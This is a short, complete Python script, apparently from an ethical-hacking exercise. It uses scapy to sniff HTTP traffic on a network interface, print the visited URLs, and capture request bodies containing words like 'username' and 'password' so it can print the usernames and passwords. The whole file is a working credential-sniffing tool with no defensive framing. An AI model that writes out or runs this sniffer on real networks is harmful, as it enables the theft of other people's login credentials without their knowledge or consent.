#!/usr/bin/env python
import argparse
import subprocess
import scapy.all as scapy
from scapy.layers import http


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface")
    value = parser.parse_args()
    if not value.interface:
        result = str(subprocess.check_output(["ip", "r"]))
        print("[+] Using Default Interface: " + result.split(' ')[4])
        value.interface = result.split(' ')[4]
        # parser.error("[-] Please specify an Interface, use -h for more info.")
    return value


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        str_load = load.decode()
        keywords = ["username", "Username", "user", "User", "login", "password", "pass", "Pass", "name", "Name"]
        for keyword in keywords:
            if keyword in str_load:
                return str_load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] URL: " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Username/Password: " + login_info + "\n\n")


options = get_arguments()
print("[+] Sniffing...")
sniff(options.interface)
